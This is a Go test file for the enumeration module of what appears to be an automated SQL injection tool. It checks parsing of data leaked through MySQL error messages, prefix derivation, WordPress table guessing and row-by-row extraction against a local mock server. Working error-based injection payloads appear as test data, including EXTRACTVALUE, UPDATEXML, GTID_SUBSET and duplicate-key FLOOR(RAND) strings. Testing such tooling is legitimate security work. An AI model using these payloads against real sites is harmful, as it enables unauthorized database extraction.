package enumeration

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/0xseif-code/vexor/internal/httpclient"
	"github.com/0xseif-code/vexor/internal/sqli"
	"github.com/0xseif-code/vexor/internal/sqli/dbms"
	"github.com/0xseif-code/vexor/internal/sqli/injection"
	"github.com/0xseif-code/vexor/internal/sqli/techniques"
)

func TestParseErrorValue(t *testing.T) {
	cases := []struct {
		body string
		max  int
		want string
		ok   bool
	}{
		{`You have an error in your SQL syntax; XPATH syntax error: '~hello~'`, 30, "hello", true},
		{`Warning: mysqli_fetch_array(): XPATH syntax error: '~a b c~'`, 30, "a b c", true},
		{`You have an error in your SQL syntax; XPATH syntax error: '~~'`, 30, "", true}, // empty value = end of data
		{`you have an error in your sql syntax; near '~wordpress~' at line 1`, 30, "wordpress", true},
		{`You have an error in your SQL syntax; Duplicate entry '~~user:root~~9-1' for key 'PRIMARY'`, 30, "user:root", true},
		{`You have an error in your SQL syntax; Duplicate entry '~~admin~~2' for key 'PRIMARY'`, 30, "admin", true},
		{`You have an error in your SQL syntax; Duplicate entry '~~~~' for key 'PRIMARY'`, 30, "", true},
		{`page without any db error`, 30, "", false},
		{`You have an error in your SQL syntax near ''`, 30, "", false}, // signature but no leak delimiter
		// Leak-only bodies carry no framework banner / DBMS signature; the
		// leak token alone must be enough to parse the value out.
		{`XPATH syntax error: '~hello~'`, 30, "hello", true},
		{`XPATH syntax error: '~~hello~~'`, 30, "hello", true},
		{`Duplicate entry '~~admin~~1' for key 'PRIMARY'`, 30, "admin", true},
		{`Duplicate entry '~~admin~~1' for key 'PRIMARY'`, 3, "adm", true},
		{`500 Internal Server Error`, 30, "", false}, // no leak token, no signature
	}
	for _, c := range cases {
		got, ok := parseErrorValue([]byte(c.body), c.max)
		if ok != c.ok || got != c.want {
			t.Errorf("parseErrorValue(%q) = (%q,%v), want (%q,%v)", c.body, got, ok, c.want, c.ok)
		}
	}
}

func TestDeriveErrorPrefix(t *testing.T) {
	cases := []struct {
		payload, prefix, suffix string
		ok                      bool
	}{
		{"1 AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -", "1 AND ", "-- -", true},
		{`1') UPDATEXML(1,CONCAT(0x7e,user(),0x7e),1)-- -`, "1') ", "-- -", true},
		{"-1 AND GTID_SUBSET(CONCAT(0x7e,(version()),0x7e),1)", "-1 AND ", "-- -", true}, // comment defaulted onto bare expression
		{"3 AND 1=1", "", "", false},                             // no leak function present
		{"EXTRACTVALUE(1,CONCAT(0x7e,v(),0x7e))", "", "", false}, // no usable prefix
		// duplicate-key channel: the CONCAT lives in a nested derived table,
		// so the whole "(SELECT 1 FROM (SELECT COUNT(*)...)a)" must be treated
		// as the replaceable expression — there is no bracketing inside the
		// outer parens after "GROUP BY x)a".
		{"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e7e,'x',0x7e7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "1' AND ", "-- -", true},
		{`") AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e7e,'x',0x7e7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`, `") AND `, "-- -", true},
	}
	for _, c := range cases {
		p, s, ok := deriveErrorPrefix(c.payload)
		if ok != c.ok || p != c.prefix || s != c.suffix {
			t.Errorf("deriveErrorPrefix(%q) = (%q,%q,%v), want (%q,%q,%v)", c.payload, p, s, ok, c.prefix, c.suffix, c.ok)
		}
	}
}

func TestPluralSwap(t *testing.T) {
	cases := map[string]string{
		"user":       "users",
		"users":      "user",
		"category":   "categories",
		"categories": "category",
		"post":       "posts",
		"posts":      "post",
		"comment":    "comments",
		"links":      "link",
	}
	for in, want := range cases {
		if got := pluralSwap(in); got != want {
			t.Errorf("pluralSwap(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestTableCandidates(t *testing.T) {
	got := tableCandidates("wp_user")
	found := map[string]bool{}
	for _, c := range got {
		found[c] = true
	}
	for _, want := range []string{"wp_user", "wp_users"} {
		if !found[want] {
			t.Errorf("tableCandidates(wp_user) missing %q; got %v", want, got)
		}
	}
	if got[0] != "wp_user" {
		t.Errorf("tableCandidates must prefer the exact name first; got %v", got)
	}
	for _, c := range tableCandidates("users") {
		if c == "user" {
			return
		}
	}
	t.Error("tableCandidates(users) should include the singular 'user'")
}

// TestAppendLimitOffset verifies LIMIT/OFFSET placement for deterministic row
// reads: the offset must be applied inside the derived table (after any ORDER
// BY) and an existing trailing LIMIT must be replaced, never doubled.
func TestAppendLimitOffset(t *testing.T) {
	cases := []struct {
		in   string
		row  int64
		want string
	}{
		{"SELECT c1 FROM (SELECT c1 from t) AS x", 3, "SELECT c1 FROM (SELECT c1 from t) AS x LIMIT 1 OFFSET 3"},
		{"SELECT c1,c2 FROM t ORDER BY id", 0, "SELECT c1,c2 FROM t ORDER BY id LIMIT 1 OFFSET 0"},
		{"SELECT c1 FROM t ORDER BY id", 9, "SELECT c1 FROM t ORDER BY id LIMIT 1 OFFSET 9"},
		// Inner-table LIMIT is not at the query tail, so it is left untouched
		// (a derived table may carry its own LIMIT) and the outer LIMIT/OFFSET
		// is appended after the wrapper close.
		{"SELECT c1 FROM (SELECT * FROM t ORDER BY id LIMIT 100) AS x", 7, "SELECT c1 FROM (SELECT * FROM t ORDER BY id LIMIT 100) AS x LIMIT 1 OFFSET 7"},
		{"SELECT c1 FROM (SELECT * FROM t LIMIT 5 OFFSET 40) AS x", 2, "SELECT c1 FROM (SELECT * FROM t LIMIT 5 OFFSET 40) AS x LIMIT 1 OFFSET 2"},
		// An actual trailing LIMIT is replaced, never doubled.
		{"SELECT c1 FROM t ORDER BY id LIMIT 100", 4, "SELECT c1 FROM t ORDER BY id LIMIT 1 OFFSET 4"},
	}
	for _, c := range cases {
		if got := appendLimitOffset(c.in, c.row); got != c.want {
			t.Errorf("appendLimitOffset(%q, %d) = %q, want %q", c.in, c.row, got, c.want)
		}
	}
	q := cellExpr("SELECT c1,c2 FROM t ORDER BY c1", 1, 5)
	if q != "SELECT c2 FROM (SELECT c1,c2 FROM t ORDER BY c1 LIMIT 1 OFFSET 5) AS x" {
		t.Errorf("cellExpr did not place the LIMIT inside the derived table: %q", q)
	}
}

func TestFuzzyTableMatch(t *testing.T) {
	tables := []string{"wp_posts", "wp_users", "wp_options"}
	if got := fuzzyTableMatch(tables, "user", tableCandidates("user")); got != "wp_users" {
		t.Errorf("fuzzyTableMatch = %q, want wp_users", got)
	}
	if got := fuzzyTableMatch(tables, "posts", tableCandidates("posts")); got != "wp_posts" {
		t.Errorf("fuzzyTableMatch = %q, want wp_posts", got)
	}
	if got := fuzzyTableMatch([]string{"orders", "order_items"}, "order", tableCandidates("order")); got != "orders" {
		t.Errorf("fuzzyTableMatch = %q, want orders", got)
	}
}

// TestErrorBasedExtraction simulates a MySQL backend that reflects a value
// through EXTRACTVALUE error messages, and verifies the full error-channel:
// calibration from the detection payload, chunked positional reads and the
// parsed value coming back intact.
func TestErrorBasedExtraction(t *testing.T) {
	valueOf := func(v string) string {
		switch {
		case strings.Contains(v, "'VEXORTEST'"):
			return "VEXORTEST"
		case strings.Contains(v, "database()"):
			return "mydb"
		case strings.Contains(v, "substring"):
			return "" // beyond the data, end of value
		default:
			return ""
		}
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		v := r.URL.Query().Get("id")
		val := valueOf(v)
		if val != "" || strings.Contains(v, "substring") {
			w.WriteHeader(500)
			fmt.Fprintf(w, "You have an error in your SQL syntax; XPATH syntax error: '~%s~'", val)
			return
		}
		if strings.Contains(v, "EXTRACTVALUE") || strings.Contains(v, "UPDATEXML") {
			w.WriteHeader(500)
			fmt.Fprintf(w, "You have an error in your SQL syntax; XPATH syntax error: '~%s~'", val)
			return
		}
		w.WriteHeader(200)
		fmt.Fprintln(w, "<!doctype html><html><body>normal</body></html>")
	}))
	defer srv.Close()

	client := httpclient.NewClient(httpclient.ClientOptions{})
	points, err := injection.Enumerate(injection.RequestSource{
		Method: "GET",
		URL:    srv.URL + "/?id=1",
	}, injection.Options{Level: 1})
	if err != nil {
		t.Fatalf("enumerate point: %v", err)
	}

	det := sqli.Detection{
		Technique: techniques.TechError,
		DBMS:      dbms.MySQL,
		Point:     *points[0],
		Payload:   "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -",
	}
	enum := NewEnumeratorOpts(det, client, Options{Concurrency: 1, Progress: io.Discard})

	got, err := enum.CurrentDatabase(context.Background())
	if err != nil {
		t.Fatalf("CurrentDatabase: %v", err)
	}
	if got != "mydb" {
		t.Errorf("CurrentDatabase = %q, want %q", got, "mydb")
	}
	if enum.ext.errChan == nil || enum.ext.errChan.Name != "extractvalue" {
		t.Errorf("calibration chose %v, want extractvalue", enum.ext.errChan)
	}
	if enum.ext.errKnown != true {
		t.Error("calibration did not stick")
	}
}
